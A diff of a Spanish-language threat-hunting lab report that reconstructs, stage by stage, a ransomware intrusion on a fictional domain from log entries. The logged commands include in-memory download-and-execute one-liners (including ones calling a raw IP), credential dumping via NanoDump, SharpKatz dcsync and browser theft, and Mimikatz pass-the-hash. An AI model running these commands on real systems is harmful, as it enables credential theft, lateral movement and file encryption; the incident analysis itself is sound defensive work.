@@ -67,9 +67,11 @@ Hashes:
 ### Command Output
 
 #### STAGE 1 LIST OF IOCs "INITIAL ACCESS" 
+
 ![Pasted image 20260513155433](../Fotos/Pasted%20image%2020260513155433.png)
 
 ![Pasted image 20260514133849](../Fotos/Pasted%20image%2020260514133849.png)
+
 Time: `Sep 26, 2023 @ 14:22:07`
 OriginalFileName: ab.exe 
 CommandLine: "C:\Windows\Installer\MSI542E.tmp" 
@@ -77,6 +79,7 @@ CurrentDirectory: C:\Windows\system32\
 User: NT AUTHORITY\SYSTEM
 
 ![Pasted image 20260514134129](../Fotos/Pasted%20image%2020260514134129.png)
+
 Time: `Sep 26, 2023 @ 14:23:02.935`
 OriginalFileName: PowerShell.EXE 
 CommandLine: powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb) 
@@ -98,7 +101,9 @@ Technique: T1204 (User Execution)
 
 ---
 #### STAGE 2 LIST OF IOCs "EXECUTION"
+
 ![Pasted image 20260513154414](../Fotos/Pasted%20image%2020260513154414.png)
+
 Time: `Sep 26, 2023 @ 14:23:07`
 Process.command_line: `powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`
 
@@ -124,7 +129,9 @@ Technique: T1059 (Command and Scripting Interpreter)
 
 ---
 #### STAGE 3 LIST OF IOCs "PERSISTENCE"
+
 ![Pasted image 20260513155102](../Fotos/Pasted%20image%2020260513155102.png)
+
 Time: `Sep 26, 2023 @ 14:23:23.989`
 Service Created: 7zService 
 Files: 7zipp.exe, 7zipp.dll
@@ -142,7 +149,9 @@ El atacante garantizó la persistencia creando un servicio malicioso de Windows 
 
 ---
 #### STAGE 4 LIST OF IOCs "DEFENSE EVASION"
+
 ![Pasted image 20260513154730](../Fotos/Pasted%20image%2020260513154730.png)
+
 Time: `Sep 26, 2023 @ 14:23:48`
 Payload: 7zipp.dll
 Command: rundll32 'C:\Program Files\7-zip\7zipp.dll',Start;
@@ -160,7 +169,9 @@ Tras crear el servicio 7zService para garantizar la persistencia, se ejecutó la
 
 ----
 #### STAGE 5 LIST OF IOCs "CREDENTIAL ACCESS"
+
 ![Pasted image 20260513154232](../Fotos/Pasted%20image%2020260513154232.png)
+
 Time: `Sep 26, 2023 @ 14:24:22.319`
 CommandLine: `-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;`
 User: `NT AUTHORITY\SYSTEM`
@@ -178,10 +189,13 @@ Una vez que su código malicioso estuvo en funcionamiento, el siguiente paso del
 
 ---
 **Descarga de script de discovery**
+
 ![Pasted image 20260511084917](../Fotos/Pasted%20image%2020260511084917.png)
+
 CommandLine: -C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/==SharpHound.ps1== -useb); Invoke-Bloodhound -c all
 
 ![Pasted image 20260511085115](../Fotos/Pasted%20image%2020260511085115.png)
+
 CommandLine: -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/==PowerView.ps1== -useb); Get-Domain
 
 *IEX ejecuta el script directamente en memoria*
@@ -191,7 +205,9 @@ Host: WKSTN-03
 
 ----
 #### STAGE 6 LIST OF IOCs "DISCOVERY"
+
 ![Pasted image 20260513153843](../Fotos/Pasted%20image%2020260513153843.png)
+
 Time: `Sep 26, 2023 @ 14:26:46.047`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all 
@@ -200,6 +216,7 @@ User: NT AUTHORITY\SYSTEM
 Host: WKSTN-03
 
 ![Pasted image 20260513154006](../Fotos/Pasted%20image%2020260513154006.png)
+
 Time: `Sep 26, 2023 @ 14:31:52.072`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-Domain 
@@ -218,7 +235,9 @@ Tras obtener las credenciales iniciales, el atacante comenzó un reconocimiento 
 
 ----
 #### STAGE 7 LIST OF IOCs "CREDENTIAL ACCESS"
+
 ![Pasted image 20260513154048](../Fotos/Pasted%20image%2020260513154048.png)
+
 Time: `Sep 26, 2023 @ 14:28:53.575`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C iwr https://github.com/gentilkiwi/==mimikatz==/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile m.zip 
@@ -247,8 +266,11 @@ perry.parsons and process.command_line : (
   "*certutil*"
 )
 ```
+
 ![Pasted image 20260510104044](../Fotos/Pasted%20image%2020260510104044.png)
+
 ![Pasted image 20260510104642](../Fotos/Pasted%20image%2020260510104642.png)
+
 *Descarga un script PowerShell desde internet y lo ejecuta directamente en memoria.*
 *Invoke-PowerExtract no es estandar de Windows* (Posible herramienta ofensiva)
 *iex(iwr ...)* (Ejecucion fileless)
@@ -293,7 +315,9 @@ agent.hostname: `WKSTN-03`
 process.command_line: `C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;`
 
 ----
+
 ![Pasted image 20260512112945](../Fotos/Pasted%20image%2020260512112945.png)
+
 Pass The Hash
 Time: `Sep 26, 2023 @ 14:29:43`
 OriginalFileName: mimikatz.exe 
@@ -315,7 +339,9 @@ Aprovechando la herramienta Mimikatz descargada, el atacante realizó un ataque 
 
 ----
 #### STAGE 9 LIST OF IOCs "ACCOUNT MANIPULATION" 
+
 ![Pasted image 20260512115052](../Fotos/Pasted%20image%2020260512115052.png)
+
 `Sep 26, 2023 @ 14:32:37.299`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword (ConvertTo-SecureString 'pwn3dpw!!!' -AsPlaintext -Force) -Domain swiftspendfinancial.thm -Verbose 
@@ -344,7 +370,9 @@ Technique: T1021 (remote services)
 
 ---
 #### STAGE 11 LIST OF IOCs "CREDENTIAL ACCESS" 
+
 ![Pasted image 20260512123112](../Fotos/Pasted%20image%2020260512123112.png)
+
 Time: `Sep 26, 2023 @ 15:08:24.764`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1 -useb); Invoke-SharpChromium -Command 'all' 
@@ -364,7 +392,9 @@ Technique: T1550 (Credential From Password Stores)
 
 ---
 #### STAGE 12 LIST OF IOCs "Discovery"
+
 ![Pasted image 20260512132608](../Fotos/Pasted%20image%2020260512132608.png)
+
 Time: `Sep 26, 2023 @ 15:14:06`
 Command: C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'AD Recovery'
 
@@ -379,7 +409,9 @@ Tras obtener las credenciales del navegador, el atacante realizó un reconocimie
 
 ---
 #### STAGE 13 LIST OF IOCs "PRIVILEGE ESCALATION" 
+
 ![Pasted image 20260512135326](../Fotos/Pasted%20image%2020260512135326.png)
+
 Time: `Sep 26, 2023 @ 15:15:34`
 CommandLine: -C $username='SSF\==itadmin'; $password='NoO6@39Sk0!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Add-DomainGroupMember -Identity 'AD Recovery -Members anna.jones -Credential $new_creds -Verbose
 
@@ -394,7 +426,9 @@ Resumen: Inmediatamente después de identificar el grupo 'AD Recovery', el ataca
 
 ---
 #### STAGE 14 LIST OF IOCs "DISCOVERY" 
+
 ![Pasted image 20260512140526](../Fotos/Pasted%20image%2020260512140526.png)
+
 Time: `Sep 26, 2023 @ 15:17:02`
 Host Application = -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'Domain Admins'
 IOCs: Domain Administrators
@@ -410,7 +444,9 @@ Tras elevar sus privilegios, el atacante realizó un reconocimiento final para l
 
 ---
 #### STAGE 15 LIST OF IOCs "CREDENTIAL ACCESS"
+
 ![Pasted image 20260513141946](../Fotos/Pasted%20image%2020260513141946.png)
+
 Time: `Sep 26, 2023 @ 15:17:19.525`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz -Command --Command dcsync --Domain swiftspendfinancial.thm --DomainController DC-01.swiftspendfinancial.thm --User damian.hall 
@@ -428,7 +464,9 @@ Una vez identificado el objetivo, el atacante utilizó 'Invoke-SharpKatz' para r
 
 ---
 #### STAGE 16 LIST OF IOCs "DISCOVERY" AQUI SOLO ES TA BIEN EL USUARIO DAMIAN.HALL Y EL ACTIVO WKSTN-02
+
 ![Pasted image 20260513151306](../Fotos/Pasted%20image%2020260513151306.png)
+
 Time: `Sep 26, 2023 @ 15:39:24.015`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C Invoke-Command -ScriptBlock {dir== C:\Users} -ComputerName WKSTN-03.swiftspendfinancial.thm C
@@ -436,6 +474,7 @@ urrentDirectory: C:\Users\anna.jones\Downloads\m\x64\
 User: SSF\anna.jones
 
 ![Pasted image 20260513145915](../Fotos/Pasted%20image%2020260513145915.png)
+
 Time: `Sep 26, 2023 @ 15:39:59.182`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C Invoke-Command -ScriptBlock {dir C:\Users\perry.parsons\Documents} -ComputerName WKSTN-03.swiftspendfinancial.thm 
@@ -455,7 +494,9 @@ Resumen: Tras obtener las credenciales de 'damian.hall', el atacante realizó un
 
 ---
 #### STAGE 17 LIST OF IOCs "COMMAND AND CONTROL" BUENA 
+
 ![Pasted image 20260510113002](../Fotos/Pasted%20image%2020260510113002.png)
+
 *Invoque-Command Permite ejecutar comandos remotamente en otro host.*
 *Descarga un ejecutable sospechoso. 777bomb.exe*
 *La actividad fue iniciada bajo la cuenta `anna.jones`.*
@@ -480,11 +521,17 @@ Resumen: Tras identificar los directorios objetivo, el atacante descargó la car
 
 -----
 #### STAGE 18 LIFT OF IOCs "IMPACT" 
+
 ![Pasted image 20260514144031](../Fotos/Pasted%20image%2020260514144031.png)
+
 ![Pasted image 20260513152950](../Fotos/Pasted%20image%2020260513152950.png)
+
 ![Pasted image 20260513153408](../Fotos/Pasted%20image%2020260513153408.png)
+
 ![Pasted image 20260513153421](../Fotos/Pasted%20image%2020260513153421.png)
+
 ![Pasted image 20260513153429](../Fotos/Pasted%20image%2020260513153429.png)
+
 Time: `Sep 26, 2023 @ 15:41:51.122`
 OriginalFileName: PowerShell.EXE 
 CommandLine: -C Invoke-Command -ScriptBlock {C:\Users\perry.parsons\bomb.exe} -ComputerName WKSTN-03.swiftspendfinancial.thm 
@@ -583,6 +630,7 @@ cifrado .777zzz
 We suspect that the attacker gained access to Perry’s system via a trojanized file he downloaded from an untrusted website. Following initial execution, the attacker may have established persistence on the host to maintain access. We further hypothesize that the attacker extracted credentials from Perry’s system using known tools such as Mimikatz, which allowed lateral movement and unauthorized access to other systems in the network. If this is confirmed, it is likely that multiple and privileged user accounts have been compromised. As a final stage in the attack chain, the attacker encrypted user files on the compromised systems, causing disruption.
 
 ![Pasted image 20260514144201](../Fotos/Pasted%20image%2020260514144201.png)
+
 # Cyber Attack Chain Report
 
 ## Executive Summary
